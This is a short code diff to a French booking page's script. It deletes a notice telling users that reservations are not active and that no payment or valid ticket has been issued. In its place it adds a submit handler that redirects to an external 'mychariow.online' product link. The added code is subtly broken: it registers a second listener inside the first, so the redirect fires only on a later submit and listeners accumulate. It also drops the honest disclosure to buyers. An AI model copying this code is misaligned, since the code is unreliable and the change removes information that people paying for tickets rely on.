@@ -355,12 +355,11 @@
     document.getElementById("booking").addEventListener("submit", function (event) {
       event.preventDefault();
 
-      const status = document.getElementById("status");
-      status.style.display = "block";
-      status.textContent =
-        "Votre formulaire est bien rempli, mais les réservations ne sont pas encore activées. Aucun paiement n'a été effectué et aucun ticket valide n'a été émis. Revenez lorsque le paiement sécurisé sera disponible.";
-      status.focus();
-    });
+      document.getElementById("booking").addEventListener("submit", function (event) {
+  event.preventDefault();
+
+  window.location.href = "https://vvoptwjd.mychariow.online/prd_oztzrvf1";
+});
 
     afficherConfiguration();
   </script>
